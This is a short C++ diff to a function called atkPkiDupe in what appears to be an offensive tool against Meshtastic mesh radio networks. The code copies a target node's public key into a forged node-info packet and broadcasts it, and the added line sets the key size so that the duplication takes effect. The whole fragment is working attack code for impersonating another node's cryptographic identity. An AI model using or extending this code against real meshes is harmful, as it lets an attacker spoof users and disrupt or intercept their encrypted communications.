@@ -142,6 +142,7 @@ void TMAttack::atkPkiDupe() {
     for (int i = 0; i < 32; i++) {
         nodeinfo.public_key[i] = node->public_key[i];  // dupe target key
     }
+    nodeinfo.public_key_size = 32;
     meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
     meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
     sendDebugMessage("Sent PKI dupe as node 0x" + std::to_string(srcnode));
